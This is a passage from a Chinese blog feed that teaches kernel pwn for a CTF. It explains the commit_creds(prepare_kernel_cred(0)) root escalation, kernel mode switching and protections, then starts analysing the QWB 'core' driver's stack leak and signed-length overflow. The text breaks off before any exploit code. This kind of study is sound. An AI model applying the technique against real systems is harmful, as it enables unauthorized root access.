    
      &lt;p&gt;兴致满满地开始比赛，骂骂咧咧地结束比赛，这个不给libc也太难受了。全程下来只做了一个Boom1，另外两个被队里TTX大哥做了。赛后看了下Boom2，也挺简单的，但是faster0是个AutoPwn，之前的De1CTF有个code runner应该也是类似的，暂且先记录一下大佬的wp，以后学习。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Competition" scheme="https://n0nop.github.io/categories/Competition/"/>
    
    
      <category term="CTF" scheme="https://n0nop.github.io/tags/CTF/"/>
    
      <category term="pwn" scheme="https://n0nop.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>kernel pwn: ROP</title>
    <link href="https://n0nop.github.io/2020/05/06/kernel-pwn-ROP/"/>
    <id>https://n0nop.github.io/2020/05/06/kernel-pwn-ROP/</id>
    <published>2020-05-05T16:51:09.000Z</published>
    <updated>2020-05-13T02:07:32.953Z</updated>
    
    <content type="html"><![CDATA[<p>早就该学习kernel pwn，否则得被时代抛弃了。先从简单的入手吧，<del>复现几道以前的ROP赛题</del>目前只找到强网杯的题目，顺便从中学习一点kernel的基础知识。</p><a id="more"></a><h1 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h1><h2 id="Kernel提权"><a href="#Kernel提权" class="headerlink" title="Kernel提权"></a>Kernel提权</h2><p>目前看到的主要是通过一下调用进行提权（应该还有更复杂的提权方法）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br></pre></td></tr></table></figure><p>其中<code>perpare_kernel_cred</code>函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_kernel_cred - Prepare a set of credentials for a kernel service</span></span><br><span class="line"><span class="comment"> * @daemon: A userspace daemon to be used as a reference</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a set of credentials for a kernel service.  This can then be used to</span></span><br><span class="line"><span class="comment"> * override a task's own credentials so that work can be done on behalf of that</span></span><br><span class="line"><span class="comment"> * task that requires a different subjective context.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @daemon is used to provide a base for the security record, but can be NULL.</span></span><br><span class="line"><span class="comment"> * If @daemon is supplied, then the security data will be derived from that;</span></span><br><span class="line"><span class="comment"> * otherwise they'll be set to 0 and no groups, full capabilities and no keys.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The caller may change these controls afterwards if desired.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns the new credentials or NULL if out of memory.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Does not take, and does not return holding current-&gt;cred_replace_mutex.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_kernel_cred</span><span class="params">(struct task_struct *daemon)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"prepare_kernel_cred() alloc %p"</span>, <span class="keyword">new</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (daemon)</span><br><span class="line">old = get_task_cred(daemon);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">old = get_cred(&amp;init_cred);</span><br><span class="line"></span><br><span class="line">validate_creds(old);</span><br><span class="line"></span><br><span class="line">*<span class="keyword">new</span> = *old;</span><br><span class="line">atomic_set(&amp;<span class="keyword">new</span>-&gt;usage, <span class="number">1</span>);</span><br><span class="line">set_cred_subscribers(<span class="keyword">new</span>, <span class="number">0</span>);</span><br><span class="line">get_uid(<span class="keyword">new</span>-&gt;user);</span><br><span class="line">get_user_ns(<span class="keyword">new</span>-&gt;user_ns);</span><br><span class="line">get_group_info(<span class="keyword">new</span>-&gt;group_info);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">new</span>-&gt;session_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;process_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;thread_keyring = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;request_key_auth = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">new</span>-&gt;jit_keyring = KEY_REQKEY_DEFL_THREAD_KEYRING;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">new</span>-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">if</span> (security_prepare_creds(<span class="keyword">new</span>, old, GFP_KERNEL) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error;</span><br><span class="line"></span><br><span class="line">put_cred(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span>;</span><br><span class="line"></span><br><span class="line">error:</span><br><span class="line">put_cred(<span class="keyword">new</span>);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释中已经把函数功能描述得很具体了，简单来说，这个函数主要是生成一个<code>cred</code>结构体，主要根据传入的参数<code>struct task_struct *daemon</code>来确定一些内核服务的credentials，以便于给当前task提供在特定的context执行的权限。<br><br>在参数为NULL的情况下，也其实就是理解为把0号进程的<code>task_struct</code>作为参数的情况下，返回一个相应的<code>cred</code>结构体，这个结构体具有最高的root权限。<br>而<code>commit_creds</code>函数定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * commit_creds - Install new credentials upon the current task</span></span><br><span class="line"><span class="comment"> * @new: The credentials to be assigned</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Install a new set of credentials to the current task, using RCU to replace</span></span><br><span class="line"><span class="comment"> * the old set.  Both the objective and the subjective credentials pointers are</span></span><br><span class="line"><span class="comment"> * updated.  This function may not be called if the subjective credentials are</span></span><br><span class="line"><span class="comment"> * in an overridden state.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This function eats the caller's reference to the new credentials.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Always returns 0 thus allowing this function to be tail-called at the end</span></span><br><span class="line"><span class="comment"> * of, say, sys_setgid().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">commit_creds</span><span class="params">(struct cred *<span class="keyword">new</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span> = <span class="title">task</span>-&gt;<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">kdebug(<span class="string">"commit_creds(%p&#123;%d,%d&#125;)"</span>, <span class="keyword">new</span>,</span><br><span class="line">       atomic_read(&amp;<span class="keyword">new</span>-&gt;usage),</span><br><span class="line">       read_cred_subscribers(<span class="keyword">new</span>));</span><br><span class="line"></span><br><span class="line">BUG_ON(task-&gt;cred != old);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">BUG_ON(read_cred_subscribers(old) &lt; <span class="number">2</span>);</span><br><span class="line">validate_creds(old);</span><br><span class="line">validate_creds(<span class="keyword">new</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">BUG_ON(atomic_read(&amp;<span class="keyword">new</span>-&gt;usage) &lt; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">get_cred(<span class="keyword">new</span>); <span class="comment">/* we will require a ref for the subj creds too */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* dumpability changes */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(old-&gt;euid, <span class="keyword">new</span>-&gt;euid) ||</span><br><span class="line">    !gid_eq(old-&gt;egid, <span class="keyword">new</span>-&gt;egid) ||</span><br><span class="line">    !uid_eq(old-&gt;fsuid, <span class="keyword">new</span>-&gt;fsuid) ||</span><br><span class="line">    !gid_eq(old-&gt;fsgid, <span class="keyword">new</span>-&gt;fsgid) ||</span><br><span class="line">    !cred_cap_issubset(old, <span class="keyword">new</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (task-&gt;mm)</span><br><span class="line">set_dumpable(task-&gt;mm, suid_dumpable);</span><br><span class="line">task-&gt;pdeath_signal = <span class="number">0</span>;</span><br><span class="line">smp_wmb();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* alter the thread keyring */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">key_fsuid_changed(task);</span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">key_fsgid_changed(task);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* do it</span></span><br><span class="line"><span class="comment"> * RLIMIT_NPROC limits on user-&gt;processes have already been checked</span></span><br><span class="line"><span class="comment"> * in set_user().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">alter_cred_subscribers(<span class="keyword">new</span>, <span class="number">2</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user)</span><br><span class="line">atomic_inc(&amp;<span class="keyword">new</span>-&gt;user-&gt;processes);</span><br><span class="line">rcu_assign_pointer(task-&gt;real_cred, <span class="keyword">new</span>);</span><br><span class="line">rcu_assign_pointer(task-&gt;cred, <span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">new</span>-&gt;user != old-&gt;user)</span><br><span class="line">atomic_dec(&amp;old-&gt;user-&gt;processes);</span><br><span class="line">alter_cred_subscribers(old, <span class="number">-2</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* send notifications */</span></span><br><span class="line"><span class="keyword">if</span> (!uid_eq(<span class="keyword">new</span>-&gt;uid,   old-&gt;uid)  ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;euid,  old-&gt;euid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;suid,  old-&gt;suid) ||</span><br><span class="line">    !uid_eq(<span class="keyword">new</span>-&gt;fsuid, old-&gt;fsuid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_UID);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!gid_eq(<span class="keyword">new</span>-&gt;gid,   old-&gt;gid)  ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;egid,  old-&gt;egid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;sgid,  old-&gt;sgid) ||</span><br><span class="line">    !gid_eq(<span class="keyword">new</span>-&gt;fsgid, old-&gt;fsgid))</span><br><span class="line">proc_id_connector(task, PROC_EVENT_GID);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* release the old obj and subj refs both */</span></span><br><span class="line">put_cred(old);</span><br><span class="line">put_cred(old);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从注释里也可以看到，这个函数的功能就是给当前task写入新的<code>cred</code>的结构体，从而改变了当前task的权限。<br><br>配合通过<code>prepare_kernel_cred(0)</code>得到的root权限的<code>cred</code>结构体，从而赋予当前task同样的root权限，这样就完成了提权。</p><h2 id="状态切换"><a href="#状态切换" class="headerlink" title="状态切换"></a>状态切换</h2><p>我们知道当进行一些系统调用，或者产生某些异常，或发生外部中断的时候，需要从用户态切换到内核态，再去执行一些内核的相关操作。而从内核态执行返回的时候，同样需要切换回用户态再去执行用户代码。<br><br>而具体的切换的过程为：</p><ol><li>从用户态到内核态：<ol><li>通过<code>swapgs</code>切换<code>GS</code>段寄存器，将<code>GS</code>寄存器值和一个特定位置的值进行交换，目的是保存<code>GS</code>值，同时将该位置的值作为内核执行时的<code>GS</code>值使用</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 rsp/esp。</li><li>通过push保存各寄存器值:  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ENTRY(entry_SYSCALL_64)</span><br><span class="line"><span class="comment">/* SWAPGS_UNSAFE_STACK是一个宏，x86直接定义为swapgs指令 */</span></span><br><span class="line">SWAPGS_UNSAFE_STACK</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 保存栈值，并设置内核栈 */</span></span><br><span class="line">movq %rsp, PER_CPU_VAR(rsp_scratch)</span><br><span class="line">movq PER_CPU_VAR(cpu_current_top_of_stack), %rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 通过push保存寄存器值，形成一个pt_regs结构 */</span></span><br><span class="line"><span class="comment">/* Construct struct pt_regs on stack */</span></span><br><span class="line">pushq  $__USER_DS      <span class="comment">/* pt_regs-&gt;ss */</span></span><br><span class="line"><span class="function">pushq  <span class="title">PER_CPU_VAR</span><span class="params">(rsp_scratch)</span>  <span class="comment">/* pt_regs-&gt;sp */</span></span></span><br><span class="line">pushq  %r11             /* pt_regs-&gt;flags */</span><br><span class="line">pushq  $__USER_CS      <span class="comment">/* pt_regs-&gt;cs */</span></span><br><span class="line">pushq  %rcx             <span class="comment">/* pt_regs-&gt;ip */</span></span><br><span class="line">pushq  %rax             <span class="comment">/* pt_regs-&gt;orig_ax */</span></span><br><span class="line">pushq  %rdi             <span class="comment">/* pt_regs-&gt;di */</span></span><br><span class="line">pushq  %rsi             <span class="comment">/* pt_regs-&gt;si */</span></span><br><span class="line">pushq  %rdx             <span class="comment">/* pt_regs-&gt;dx */</span></span><br><span class="line">pushq  %rcx tuichu    <span class="comment">/* pt_regs-&gt;cx */</span></span><br><span class="line">pushq  $-ENOSYS        <span class="comment">/* pt_regs-&gt;ax */</span></span><br><span class="line">pushq  %r8              <span class="comment">/* pt_regs-&gt;r8 */</span></span><br><span class="line">pushq  %r9              <span class="comment">/* pt_regs-&gt;r9 */</span></span><br><span class="line">pushq  %r10             <span class="comment">/* pt_regs-&gt;r10 */</span></span><br><span class="line">pushq  %r11             <span class="comment">/* pt_regs-&gt;r11 */</span></span><br><span class="line">sub $(<span class="number">6</span>*<span class="number">8</span>), %rsp      <span class="comment">/* pt_regs-&gt;bp, bx, r12-15 not saved */</span></span><br></pre></td></tr></table></figure><ol><li>通过汇编指令判断是否为x32_abi</li><li>通过系统调用号，跳到全局变量<code>sys_call_table</code>相应位置继续执行系统调用。</li></ol></li></ol></li><li>从内核态到用户态<ol><li>通过<code>swapgs</code>恢复<code>GS</code>值</li><li>通过<code>sysretq</code>或者<code>iretq</code>恢复到用户控件继续执行。如果使用<code>iretq</code>还需要给出用户空间的一些信息（<code>CS</code>, <code>eflags/rflags</code>, <code>esp/rsp</code>）等。<h2 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a>ioctl</h2><code>ioctl</code>也是一个系统调用，用于与设备通信，函数调用的原型是:<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ioctl</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> request, ...)</span></span>;</span><br></pre></td></tr></table></figure>功能就是打开<code>fd</code>设备，根据<code>request</code>查找相应设备定义的功能，后面就是根据设备功能的具体定义传递相应的参数。<br>至于可以调用的功能，在设备模块中，有相应的<code>ioctl</code>功能定义。</li></ol></li></ol><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>一般来说，对于一个kernel pwn的题目，通常给以下文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">boot.sh: 一个用于启动kernel的shell的脚本，多用qemu，保护措施与qemu不同的启动参数有关</span><br><span class="line">bzImage: kernel binary</span><br><span class="line">rootfs.cpio: 文件系统映像</span><br><span class="line">vmlinux: 类比成linux pwn中的libc文件（有时不一定提供）</span><br></pre></td></tr></table></figure><p>对于所给文件的进行分析：</p><ol><li>解包文件系统映像（以<code>core.cpio</code>举例）: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir core # 创建目录core</span><br><span class="line">mv core.cpio ./core/core.cpio.gz # 重命名core.cpio为core.cpio.gz从而进行后续解压操作</span><br><span class="line">gunzip core.cpio.gz # 解包得到core.cpio(ASCII cpio archive)</span><br><span class="line">cpio -idmv &lt; core.cpio  # cpio为归档工具，"i", "d", "m", "v"参数分别表示：</span><br><span class="line">                        # -i: (extract)指定运行为copy-in模式，即目录拷贝模式</span><br><span class="line">                        # -d: 在需要的地方创建目录</span><br><span class="line">                        # -m: 保留文件原始的修改时间</span><br><span class="line">                        # -v: 在屏幕上打印出相关信息</span><br></pre></td></tr></table></figure></li><li>解包后的重要文件（以强网杯core为例）: <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">core.ko # 含有漏洞的目标驱动文件（一般来说都会提供一个含有漏洞的模块）</span><br><span class="line">gen_cpio.sh # 用来打包的脚本，将解包出的文件重新打包为core.cpio</span><br><span class="line">            # shell脚本内容是：find . -print0 | cpio --null -ov --format=newc | gzip -9 &gt; $1</span><br><span class="line">            # 其他题目不一定给，需要自己写</span><br><span class="line">init # kernel启动的初始化文件</span><br></pre></td></tr></table></figure></li></ol><h2 id="保护机制"><a href="#保护机制" class="headerlink" title="保护机制"></a>保护机制</h2><ol><li>smep: <code>Supervisor Mode Execution Protection</code>，当处理器处于<code>ring 0</code>模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</li><li>smap: <code>Superivisor Mode Access Protection</code>，类似于smep，当处理器处于<code>ring 0</code>模式，访问用户空间的数据会触发页错误。</li><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>kalsr：<code>Kernel Address Space Layout Randomization</code>(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li></ol><h2 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h2><p>一般在启动脚本<code>start.sh</code>中，添加以下内容:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-gdb tcp:port</span><br></pre></td></tr></table></figure><p>或者:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s # "-gdb tcp:1234"的简写</span><br></pre></td></tr></table></figure><h1 id="强网杯kernel-pwn-core复现"><a href="#强网杯kernel-pwn-core复现" class="headerlink" title="强网杯kernel pwn core复现"></a>强网杯kernel pwn core复现</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>查看驱动模块<code>core.ko</code>的保护，这里显示<code>No PIE</code>是错误的，实际上开了PIE：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>从<code>start.sh</code>中可以看到开了kaslr，但是没开smep：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-append "root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr"</span><br></pre></td></tr></table></figure><p><code>ioctl</code>提供了三个功能：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">    v3 = a3;</span><br><span class="line">    <span class="keyword">switch</span> ( (_DWORD)a2 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889B</span>:</span><br><span class="line">        core_read(a3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889C</span>:</span><br><span class="line">        printk(&amp;unk_2CD, a3);</span><br><span class="line">        off = v3;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6677889A</span>:</span><br><span class="line">        printk(&amp;unk_2B3, a2);</span><br><span class="line">        core_copy_func(v3);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><code>0x6677889B</code>功能调用<code>core_read</code>，从内核栈<code>&amp;v6+off</code>开始的位置读取0x40 bytes的数据写入到用户空间中： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall core_read(__int64 a1, __int64 a2)</span><br><span class="line">&#123;</span><br><span class="line">    __int64 v2; &#x2F;&#x2F; rbx</span><br><span class="line">    __int64 *v3; &#x2F;&#x2F; rdi</span><br><span class="line">    __int64 i; &#x2F;&#x2F; rcx</span><br><span class="line">    unsigned __int64 result; &#x2F;&#x2F; rax</span><br><span class="line">    __int64 v6; &#x2F;&#x2F; [rsp+0h] [rbp-50h]</span><br><span class="line">    unsigned __int64 v7; &#x2F;&#x2F; [rsp+40h] [rbp-10h]</span><br><span class="line"></span><br><span class="line">    v2 &#x3D; a1;</span><br><span class="line">    v7 &#x3D; __readgsqword(0x28u);</span><br><span class="line">    printk(&amp;unk_25B, a2);</span><br><span class="line">    printk(&amp;unk_275, off);</span><br><span class="line">    v3 &#x3D; &amp;v6;</span><br><span class="line">    for ( i &#x3D; 16LL; i; --i )</span><br><span class="line">    &#123;</span><br><span class="line">        *(_DWORD *)v3 &#x3D; 0;</span><br><span class="line">        v3 &#x3D; (__int64 *)((char *)v3 + 4);</span><br><span class="line">    &#125;</span><br><span class="line">    strcpy((char *)&amp;v6, &quot;Welcome to the QWB CTF challenge.\n&quot;);</span><br><span class="line">    result &#x3D; copy_to_user(v2, (char *)&amp;v6 + off, 64LL);</span><br><span class="line">    if ( !result )</span><br><span class="line">        return __readgsqword(0x28u) ^ v7;</span><br><span class="line">    __asm &#123; swapgs &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><code>0x6677889C</code>功能，将<code>off</code>设置为传入的参数，也就是<code>off</code>是可控的：</li><li><code>0x6677889A</code>功能，调用<code>core_copy_func</code>将<code>name</code>的字符串copy到栈上变量<code>v3</code>中，长度由用户态传入的参数控制。这里因为传入的<code>a1</code>参数是有符号的，因此可以通过传入负数绕过<code>a1 &gt; 63</code>的check，而<code>qmemcpy(&amp;v3, 